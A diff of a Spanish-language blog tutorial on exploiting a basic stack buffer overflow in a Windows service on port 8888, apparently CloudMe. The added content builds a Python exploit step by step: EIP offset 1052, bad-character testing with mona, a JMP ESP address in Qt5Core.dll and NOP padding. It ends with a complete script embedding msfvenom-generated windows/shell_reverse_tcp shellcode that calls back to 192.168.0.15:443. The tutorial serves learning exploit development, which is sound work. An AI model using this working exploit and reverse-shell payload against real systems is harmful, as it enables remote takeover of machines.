@@ -1,6 +1,6 @@
 ---
 layout: single
-title: WIP BufferOverFlow (Basic)
+title: BufferOverFlow (Basic)
 excerpt: "He decidido crearme una pagina para ir publicando todo lo que voy aprendiendo y asi si le es util a alguien mas, puede utilizar el contenido, tambien hare writeups de vez en cuando no tanto con el objetivo de eseñar como resolver dicha maquina sino para repasar como la hize, pero lo dicho que si a alguien le es util, ahi esta."
 date: 2021-08-19
 classes: wide
@@ -101,7 +101,7 @@ El objetivo es encontrar en que posicion de 'A'es escribimos el EIP.
 
 * Mediante el uso del framework metasploit creamos un payload especialmente diseñado para encontrar la posicion donde sobreecribimos el EIP
 
-`/usr/share/metasploit-framework/tools/exploit/pattern_create -l 5000`
+  `/usr/share/metasploit-framework/tools/exploit/pattern_create -l 5000`
 
 _En este caso utilizamos una longitud de 5000 porque ya sabemos que con 5000 es suficiente para que se colapse el servicio_
 
@@ -134,10 +134,348 @@ if __name__ == "__main__":
   executableExploit()
 
 ```
+* Con Immunity Debugger observamos que valor tiene el EIP (316A4230)
+
+* Con la herramienta **pattern_offset** comprobamos cuantas 'A'es tienen que escribirse antes de sobreescribir el EIP.
+
+  `/usr/share/metasploit-framework/tools/exploit/patter_offset.rb -q 316A4230`
+
+  > [*] Exact match at offset 1052
+
+## Actualizando el script.py con la nueva informacion
+
+* Probaremos a insertar 1052 'A'es, 4 'B's para el EIP y por ultimo 500 'C's para ver que sobreescribe el resto de la informacion
+
+```py
+#!/usr/bin/python3
+
+import socket
+import signal
+import pdb
+import sys
+import time
+
+from pwn import *
+from struct import pack
+
+# Variables globales
+remoteAddress = "127.0.0.1"
+
+def executableExploit():
+  offset = 1052
+  before_eip = b"A" * offset
+  eip = b"B" * 4
+  after_eip = b"C" * 500
+
+  payload = before_eip + eip + after_eip
+
+  # Establecemos un socket TCP
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((remoteAddress, 8888))
+  s.send(payload)
+
+if __name__ == "__main__":
+  executableExploit()
+
+```
+
+## Analizando resultados
+
+Observamos que todas esas 'C's se han ido a **ESP** que es el Stack o "pila". Es decir que si queremos que el programa ejecute lo que inyectamos despues del EIP, tenemos que hacer que el flujo del programa vaya por el **ESP.** 
+
+Nos encontramos el problema de que no podemos indicarle al EIP directamente el ESP, asique tenemos que utilizar un concepto llamado **OPCODE.**
+
+Esto es un concepto a bajo nivel que se nos permite hacer un salto a la pila o **JMPESP.**
+
+## BadChars
+
+Pero antes de saber como hacer eso, tenemos que descubrir los **BadChars**, estos son ciertos caracteres que hacen que no se pueda interpretar el codigo.
+
+* Establecemos el directorio de trabajo para mona
+
+  `!mona config -set workingfolder C:\Users\%USERNAME%\Desktop\%p`
+
+* Con este comando creamos una lista con todos los caracteres en hexadecimal y con la flag `-cpb` vamos eliminando los badchars que aparezcan. 
+
+  Ej: `!mona bytearray -cpb "\x00\x01\x02\x03"`
+
+_NOTA: Como medida de prevencion, es una buena practica quitar el \x00 siempre ya que suele dar problemas y es un BadChar comun._
+
+* Añadimos al script.py los badchars
+
+```py
+#!/usr/bin/python3
+
+import socket
+import signal
+import pdb
+import sys
+import time
+
+from pwn import *
+from struct import pack
+
+# Variables globales
+remoteAddress = "127.0.0.1"
+
+def executableExploit():
+  offset = 1052
+  before_eip = b"A" * offset
+  eip = b"B" * 4
+  badChars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0 \xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+  payload = before_eip + eip + badChars
+
+  # Establecemos un socket TCP
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((remoteAddress, 8888))
+  s.send(payload)
+
+if __name__ == "__main__":
+  executableExploit()
+
+```
+
+* En Immunity Debugger, gracias a mona podemos comprobar si hay algun BadChar.
+  `!mona compare -f C:\Users\%USERNAME%\Desktop\CloudMe\bytearray.txt -a <direccion donde empieza el ESP>`
+
+  Ej:
+  `!mona compare -f C:\Users\%USERNAME%\Desktop\CloudMe\bytearray.txt -a 0022D470`
+
+## Creando shell code malicioso con los BadChars
+
+* Utilizamos msfvenom para crear el codigo
+
+  `msfvenom -p windows/shell_reverse_tcp LHOST=<ip de victima> LPORT=443 -a x86 --platform windows -b <badchars> -e x86/shikata_ga_nai -f c`
+
+  Ej:
+  `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.15 LPORT=443 -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -f c`
+
+* Añadimos el codigo al script.py
+
+```py
+#!/usr/bin/python3
+
+import socket
+import signal
+import pdb
+import sys
+import time
+
+from pwn import *
+from struct import pack
+
+# Variables globales
+remoteAddress = "127.0.0.1"
+
+def executableExploit():
+  offset = 1052
+  before_eip = b"A" * offset
+  eip = b"B" * 4
+  shellcode = (b"\xba\xf8\x9f\xaf\x72\xda\xce\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
+        b"\x52\x31\x55\x12\x83\xc5\x04\x03\xad\x91\x4d\x87\xb1\x46\x13"
+        b"\x68\x49\x97\x74\xe0\xac\xa6\xb4\x96\xa5\x99\x04\xdc\xeb\x15"
+        b"\xee\xb0\x1f\xad\x82\x1c\x10\x06\x28\x7b\x1f\x97\x01\xbf\x3e"
+        b"\x1b\x58\xec\xe0\x22\x93\xe1\xe1\x63\xce\x08\xb3\x3c\x84\xbf"
+        b"\x23\x48\xd0\x03\xc8\x02\xf4\x03\x2d\xd2\xf7\x22\xe0\x68\xae"
+        b"\xe4\x03\xbc\xda\xac\x1b\xa1\xe7\x67\x90\x11\x93\x79\x70\x68"
+        b"\x5c\xd5\xbd\x44\xaf\x27\xfa\x63\x50\x52\xf2\x97\xed\x65\xc1"
+        b"\xea\x29\xe3\xd1\x4d\xb9\x53\x3d\x6f\x6e\x05\xb6\x63\xdb\x41"
+        b"\x90\x67\xda\x86\xab\x9c\x57\x29\x7b\x15\x23\x0e\x5f\x7d\xf7"
+        b"\x2f\xc6\xdb\x56\x4f\x18\x84\x07\xf5\x53\x29\x53\x84\x3e\x26"
+        b"\x90\xa5\xc0\xb6\xbe\xbe\xb3\x84\x61\x15\x5b\xa5\xea\xb3\x9c"
+        b"\xca\xc0\x04\x32\x35\xeb\x74\x1b\xf2\xbf\x24\x33\xd3\xbf\xae"
+        b"\xc3\xdc\x15\x60\x93\x72\xc6\xc1\x43\x33\xb6\xa9\x89\xbc\xe9"
+        b"\xca\xb2\x16\x82\x61\x49\xf1\x6d\xdd\x51\x11\x06\x1c\x51\x10"
+        b"\x6d\xa9\xb7\x78\x81\xfc\x60\x15\x38\xa5\xfa\x84\xc5\x73\x87"
+        b"\x87\x4e\x70\x78\x49\xa7\xfd\x6a\x3e\x47\x48\xd0\xe9\x58\x66"
+        b"\x7c\x75\xca\xed\x7c\xf0\xf7\xb9\x2b\x55\xc9\xb3\xb9\x4b\x70"
+        b"\x6a\xdf\x91\xe4\x55\x5b\x4e\xd5\x58\x62\x03\x61\x7f\x74\xdd"
+        b"\x6a\x3b\x20\xb1\x3c\x95\x9e\x77\x97\x57\x48\x2e\x44\x3e\x1c"
+        b"\xb7\xa6\x81\x5a\xb8\xe2\x77\x82\x09\x5b\xce\xbd\xa6\x0b\xc6"
+        b"\xc6\xda\xab\x29\x1d\x5f\xdb\x63\x3f\xf6\x74\x2a\xaa\x4a\x19"
+        b"\xcd\x01\x88\x24\x4e\xa3\x71\xd3\x4e\xc6\x74\x9f\xc8\x3b\x05"
+        b"\xb0\xbc\x3b\xba\xb1\x94")
+
+  payload = before_eip + eip + shellcode
+
+  # Establecemos un socket TCP
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((remoteAddress, 8888))
+  s.send(payload)
+
+if __name__ == "__main__":
+  executableExploit()
+
+```
+
+## OPCODE
+
+Aunque como ya sabemos no podemos indicar el ESP directamente, podemos apuntar a una direccion de memoria que ejecute el comando JMPESP.
+
+* Para ello buscamos modulos en mona
+
+  `!mona modules`
+
+* Bucamos una .dll con todas las protecciones en FALSE (y preferiblemente que sea del propio programa o un programa comun entre nuestro entorno windows que estamos utilizando para preparar el script, y la maquina victima)
+
+<center><img src="https://s4vinotes.michellopez.org/images/Buff-protection_false.png"></center>
+
+* Utilizamos la pagina [defuse.ca](https://defuse.ca/online-x86-assembler.htm) para buscar el opcode `jmp esp`
+
+  > Disassembly:
+  >
+  >0:  ff e4                   jmp    esp
+
+* Buscamos el opcode en el dll que hemos seleccionado
+
+  `!mona find -s "\xff\xe4" -m <dll seleccionado>`
+
+  Ej:
+  `!mona find -s "\xff\xe4" -m Qt5Core.dll`
+
+* Copiamos una direccion que tenga permisos de ejecucion
+
+<center><img src="https://s4vinotes.michellopez.org/images/Buff-execution-rights-jmpesp.png"></center>
+
+* Añadimos al script la direccion seleccionada en formato little-endian en el EIP, para que sea mas comodo utilizamos la libreria "struct" funcion "pack"
+
+```py
+#!/usr/bin/python3
+
+import socket
+import signal
+import pdb
+import sys
+import time
+
+from pwn import *
+from struct import pack
+
+# Variables globales
+remoteAddress = "127.0.0.1"
+
+def executableExploit():
+  offset = 1052
+  before_eip = b"A" * offset
+  eip = pack("<I", 0x68a98a7b)
+  shellcode = (b"\xba\xf8\x9f\xaf\x72\xda\xce\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
+        b"\x52\x31\x55\x12\x83\xc5\x04\x03\xad\x91\x4d\x87\xb1\x46\x13"
+        b"\x68\x49\x97\x74\xe0\xac\xa6\xb4\x96\xa5\x99\x04\xdc\xeb\x15"
+        b"\xee\xb0\x1f\xad\x82\x1c\x10\x06\x28\x7b\x1f\x97\x01\xbf\x3e"
+        b"\x1b\x58\xec\xe0\x22\x93\xe1\xe1\x63\xce\x08\xb3\x3c\x84\xbf"
+        b"\x23\x48\xd0\x03\xc8\x02\xf4\x03\x2d\xd2\xf7\x22\xe0\x68\xae"
+        b"\xe4\x03\xbc\xda\xac\x1b\xa1\xe7\x67\x90\x11\x93\x79\x70\x68"
+        b"\x5c\xd5\xbd\x44\xaf\x27\xfa\x63\x50\x52\xf2\x97\xed\x65\xc1"
+        b"\xea\x29\xe3\xd1\x4d\xb9\x53\x3d\x6f\x6e\x05\xb6\x63\xdb\x41"
+        b"\x90\x67\xda\x86\xab\x9c\x57\x29\x7b\x15\x23\x0e\x5f\x7d\xf7"
+        b"\x2f\xc6\xdb\x56\x4f\x18\x84\x07\xf5\x53\x29\x53\x84\x3e\x26"
+        b"\x90\xa5\xc0\xb6\xbe\xbe\xb3\x84\x61\x15\x5b\xa5\xea\xb3\x9c"
+        b"\xca\xc0\x04\x32\x35\xeb\x74\x1b\xf2\xbf\x24\x33\xd3\xbf\xae"
+        b"\xc3\xdc\x15\x60\x93\x72\xc6\xc1\x43\x33\xb6\xa9\x89\xbc\xe9"
+        b"\xca\xb2\x16\x82\x61\x49\xf1\x6d\xdd\x51\x11\x06\x1c\x51\x10"
+        b"\x6d\xa9\xb7\x78\x81\xfc\x60\x15\x38\xa5\xfa\x84\xc5\x73\x87"
+        b"\x87\x4e\x70\x78\x49\xa7\xfd\x6a\x3e\x47\x48\xd0\xe9\x58\x66"
+        b"\x7c\x75\xca\xed\x7c\xf0\xf7\xb9\x2b\x55\xc9\xb3\xb9\x4b\x70"
+        b"\x6a\xdf\x91\xe4\x55\x5b\x4e\xd5\x58\x62\x03\x61\x7f\x74\xdd"
+        b"\x6a\x3b\x20\xb1\x3c\x95\x9e\x77\x97\x57\x48\x2e\x44\x3e\x1c"
+        b"\xb7\xa6\x81\x5a\xb8\xe2\x77\x82\x09\x5b\xce\xbd\xa6\x0b\xc6"
+        b"\xc6\xda\xab\x29\x1d\x5f\xdb\x63\x3f\xf6\x74\x2a\xaa\x4a\x19"
+        b"\xcd\x01\x88\x24\x4e\xa3\x71\xd3\x4e\xc6\x74\x9f\xc8\x3b\x05"
+        b"\xb0\xbc\x3b\xba\xb1\x94")
+
+  payload = before_eip + eip + shellcode
+
+  # Establecemos un socket TCP
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((remoteAddress, 8888))
+  s.send(payload)
+
+if __name__ == "__main__":
+  executableExploit()
+
+```
+## Tiempo para desencriptacion del codigo
+
+Opciones:
+
+&nbsp;&nbsp;&nbsp;&nbsp;A. Añadir "No Operation code" **NOPS**
+
+&nbsp;&nbsp;&nbsp;&nbsp;B. Realizar un desplazamiento de la pila con la instruccion `sub esp, 0x10`
+
+### NOPS
+
+* Añadimos los NOPS entre el **EIP** y el **shellcode**, con 16 NOPS son suficientes
+
+```py
+#!/usr/bin/python3
+
+import socket
+import signal
+import pdb
+import sys
+import time
+
+from pwn import *
+from struct import pack
+
+# Variables globales
+remoteAddress = "127.0.0.1"
+
+def executableExploit():
+  offset = 1052
+  before_eip = b"A" * offset
+  eip = pack("<I", 0x68a98a7b)
+  NOPS = b"\x90" * 16
+  shellcode = (b"\xba\xf8\x9f\xaf\x72\xda\xce\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
+        b"\x52\x31\x55\x12\x83\xc5\x04\x03\xad\x91\x4d\x87\xb1\x46\x13"
+        b"\x68\x49\x97\x74\xe0\xac\xa6\xb4\x96\xa5\x99\x04\xdc\xeb\x15"
+        b"\xee\xb0\x1f\xad\x82\x1c\x10\x06\x28\x7b\x1f\x97\x01\xbf\x3e"
+        b"\x1b\x58\xec\xe0\x22\x93\xe1\xe1\x63\xce\x08\xb3\x3c\x84\xbf"
+        b"\x23\x48\xd0\x03\xc8\x02\xf4\x03\x2d\xd2\xf7\x22\xe0\x68\xae"
+        b"\xe4\x03\xbc\xda\xac\x1b\xa1\xe7\x67\x90\x11\x93\x79\x70\x68"
+        b"\x5c\xd5\xbd\x44\xaf\x27\xfa\x63\x50\x52\xf2\x97\xed\x65\xc1"
+        b"\xea\x29\xe3\xd1\x4d\xb9\x53\x3d\x6f\x6e\x05\xb6\x63\xdb\x41"
+        b"\x90\x67\xda\x86\xab\x9c\x57\x29\x7b\x15\x23\x0e\x5f\x7d\xf7"
+        b"\x2f\xc6\xdb\x56\x4f\x18\x84\x07\xf5\x53\x29\x53\x84\x3e\x26"
+        b"\x90\xa5\xc0\xb6\xbe\xbe\xb3\x84\x61\x15\x5b\xa5\xea\xb3\x9c"
+        b"\xca\xc0\x04\x32\x35\xeb\x74\x1b\xf2\xbf\x24\x33\xd3\xbf\xae"
+        b"\xc3\xdc\x15\x60\x93\x72\xc6\xc1\x43\x33\xb6\xa9\x89\xbc\xe9"
+        b"\xca\xb2\x16\x82\x61\x49\xf1\x6d\xdd\x51\x11\x06\x1c\x51\x10"
+        b"\x6d\xa9\xb7\x78\x81\xfc\x60\x15\x38\xa5\xfa\x84\xc5\x73\x87"
+        b"\x87\x4e\x70\x78\x49\xa7\xfd\x6a\x3e\x47\x48\xd0\xe9\x58\x66"
+        b"\x7c\x75\xca\xed\x7c\xf0\xf7\xb9\x2b\x55\xc9\xb3\xb9\x4b\x70"
+        b"\x6a\xdf\x91\xe4\x55\x5b\x4e\xd5\x58\x62\x03\x61\x7f\x74\xdd"
+        b"\x6a\x3b\x20\xb1\x3c\x95\x9e\x77\x97\x57\x48\x2e\x44\x3e\x1c"
+        b"\xb7\xa6\x81\x5a\xb8\xe2\x77\x82\x09\x5b\xce\xbd\xa6\x0b\xc6"
+        b"\xc6\xda\xab\x29\x1d\x5f\xdb\x63\x3f\xf6\x74\x2a\xaa\x4a\x19"
+        b"\xcd\x01\x88\x24\x4e\xa3\x71\xd3\x4e\xc6\x74\x9f\xc8\x3b\x05"
+        b"\xb0\xbc\x3b\xba\xb1\x94")
+
+  payload = before_eip + eip + NOPS + shellcode
+
+  # Establecemos un socket TCP
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((remoteAddress, 8888))
+  s.send(payload)
+
+if __name__ == "__main__":
+  executableExploit()
+
+```
+
+### Desplazamiento de la pila
+
+<span style="color:red">*Work In Progress*</span>
 
 ## Comandos utiles:
 Linux:
+* `service opensnitch stop` --> evitar problemas con el --min-rate de nmap
 * `lsof -i:8888` --> listar servicio en el puerto 8888
-
-Windows:
-
